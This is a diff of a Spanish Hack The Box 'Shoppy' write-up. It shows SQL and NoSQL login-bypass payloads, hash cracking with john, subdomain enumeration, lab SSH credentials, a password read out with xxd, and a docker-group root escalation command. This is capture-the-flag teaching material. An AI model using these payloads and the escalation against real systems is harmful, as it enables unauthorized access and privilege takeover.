@@ -72,10 +72,26 @@ ID           Response   Lines    Word       Chars       Payload
 000000291:   301        10 L     16 W       179 Ch      "assets"                                                                                                               
 000000259:   302        0 L      4 W        28 Ch       "admin"   
 ```
-Nos encontramos con **/login** , intentamos acceder pero esta protegido por un login, podemos probar con una injección **SQL** pero la web no usa **SQL**
+Nos encontramos con **/login** , intentamos acceder pero esta protegido por un login, podemos probar con una injección **SQL** y ver si es vulnerable a este tipo de ataque.
 
 ![Login Shoppy]({{ 'assets/img/commons/shoppy-writeup/login.png' | relative_url }}){: .center-image }
 _Login Shoppy_
+
+Introducimos una comilla al final del usuario para ver si la query de la consulta es vulnerable a SQL injection, notamos que el servidor se demora en responder, por lo que confirmamos que es vulnerble.
+
+![Login Shoppy]({{ 'assets/img/commons/shoppy-writeup/login3.png' | relative_url }}){: .center-image }
+_Login Shoppy_
+
+```bash
+'
+'-- -
+' or '1'='1
+' or '1'='1'-- -
+```
+![Login Shoppy]({{ 'assets/img/commons/shoppy-writeup/login1.png' | relative_url }}){: .center-image }
+_Bypass Login_
+
+Pero vemos que ninguna funciona, eso nos da una pista que debemos probar con una injección NoSQL, una base de las bases de datos mas usadas son **MongoDB**, 
 
 
 Podemos probar `admin'||'1==1` y poner cualquier contraseña:
@@ -87,7 +103,7 @@ _Bypass Login_
 Bingo!!! Ganamos acceso como administrador, en el buscador podemos repetir la injección.
 ![Login Shoppy]({{ 'assets/img/commons/shoppy-writeup/login2.png' | relative_url }}){: .center-image }
 
-Nos sale una opción para descargar, cuando vemos el archivo vemos 2 usuarios y sus respectivos hashes. Creamos un archivo con los hashes y lo intentaremos crakear con john
+Nos sale una opción para descargar un archivo `JSON`, cuando vemos el archivo vemos 2 usuarios y sus respectivos hashes. Creamos un archivo con los hashes y lo intentaremos crakear con john
 
 ```bash
 echo "admin:23c6877d9e2b564ef8b32c3a23de27b2" > hashes
@@ -104,8 +120,6 @@ Session completed
 
 ```
 Tenemos una contraseña, podemos buscar por subdominios a ver que nos encontramos
-
-
 
 ```bash
 ❯ gobuster vhost  -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb/ -t 200
@@ -126,15 +140,16 @@ Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]
 Progress: 52985 / 100001 (52.98%)    
 ```
 
-Tenemos un subdominio, la misma historia lo añadimos en el `etc/host`.
-
+Tenemos un subdominio, la misma historia lo añadimos en el `/etc/hosts`.
 
 Al entrar en el web nos encontramos con esto
 ![Login Shoppy]({{ 'assets/img/commons/shoppy-writeup/josh.png' | relative_url }}){: .center-image }
 _Login Mattermost_
 
-
 Viendo las conversaciones nos dan un usuario y sus credenciales para el *SSH*, nos conectamos.
+![Login Shoppy]({{ 'assets/img/commons/shoppy-writeup/matt.png' | relative_url }}){: .center-image }
+_Information leaked_
+
 ```bash
 ❯ ssh jaeger@10.10.11.180
 jaeger@10.10.11.180's password: Sh0ppyBest@pp!
@@ -151,12 +166,13 @@ manpath: can't set the locale; make sure $LC_* and $LANG are correct
 jaeger@shoppy:~$ export TERM=xterm
 jaeger@shoppy:~$ 
 ```
-Una vez dentro podemos ver si tenemos un privilegio asignado a sudo,vemos que podemos ejecutar como el usuario `deploy` un ejecutable 
+Una vez dentro podemos ver si tenemos algún privilegio asignado a sudo, vemos que podemos ejecutar como el usuario `deploy` un ejecutable.
 
 ## Enumeración del sistema
 
 ```bash
 jaeger@shoppy:~$ sudo -l
+[sudo] password for jaeger: Sh0ppyBest@pp!
 Matching Defaults entries for jaeger on shoppy:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
@@ -165,7 +181,15 @@ User jaeger may run the following commands on shoppy:
 jaeger@shoppy:~$ 
 
 ```
-Jugando con XXD podemos ver que la contraseña se filtra, bingo ya descubrimos la contraseña, ahora lo ejecutamos como el usuario deploy
+Intentamos ejecutar el comando
+```bash
+jaeger@shoppy:~$ sudo -u deploy /home/deploy/passw*
+Welcome to Josh password manager!
+Please enter your master password: Password
+Access denied! This incident will be reported !
+jaeger@shoppy:~$ 
+```
+La contraseña no es correcta, jugando con `XXD` podemos ver que la contraseña se filtra, bingo ya descubrimos la contraseña, ahora lo ejecutamos como el usuario deploy
 
 
 ![Login Shoppy]({{ 'assets/img/commons/shoppy-writeup/xxd.png' | relative_url }}){: .center-image }
@@ -182,8 +206,7 @@ username: deploy
 password: Deploying@pp!
 jaeger@shoppy:~$ 
 ```
-Podemos migrar al usuario *Deploy* 
-
+Podemos migrar al usuario *Deploy* .
 
 ```bash
 jaeger@shoppy:~$ su deploy
@@ -198,15 +221,13 @@ deploy@shoppy:/home/jaeger$
 
 ## Escalada de privilegios
 Pertenecemos al grupo `docker`  mirando [GtfObins](https://gtfobins.github.io/gtfobins/docker/#shell) podemos ver que podemos abusar del grupo **docker**
-Ejecutamos el comando y nos da una shell como root
+Ejecutamos el comando nos da una shell como root.
 
  ```bash
  deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash
 root@3ea87a82734f:/# 
-@S4vitaar a mi me gustaban los dislikes, ahora tengo que usar una extension
  ```
-Ganamos acceso root, ta rooteamos las máquinasahora podemos leer las flags.
-
+Ganamos acceso root, ya rooteamos la máquina ahora podemos leer las  flags respectivas para cada usuario.
 
 ```bash
 root@3ea87a82734f:~# cat root.txt 
